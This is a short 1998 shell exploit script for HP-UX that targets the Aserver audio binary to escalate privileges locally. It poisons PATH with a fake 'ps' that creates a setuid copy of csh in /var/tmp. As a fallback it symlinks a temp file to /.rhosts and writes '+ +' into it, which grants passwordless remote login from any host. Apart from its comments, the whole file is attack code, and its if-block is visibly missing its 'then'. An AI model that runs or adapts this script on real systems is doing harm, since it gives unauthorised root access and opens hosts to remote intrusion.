#!/bin/sh
#
# HP-UX aserver.sh - Loneguard 18/10/98
# Simple no brainer path poison followed by a twist [ inspired by DC ;) ]
#
cd /var/tmp
cat < _EOF > ps
#!/bin/sh
cp /bin/csh /var/tmp/.foosh
chmod 4755 /var/tmp/.foosh
_EOF
chmod 755 ps
PATH=.:$PATH
/opt/audio/bin/Aserver -f
if [ -e /var/tmp/.foosh ]
        # Hmmm, you not like that technique?
        cd /tmp
        rm last_uuid
        ln -s /.rhosts last_uuid
        /opt/audio/bin/Aserver -f
        echo "+ +" > /.rhosts
        # Haha, my Kungfu is the best!
fi
echo Crazy MONKEY!
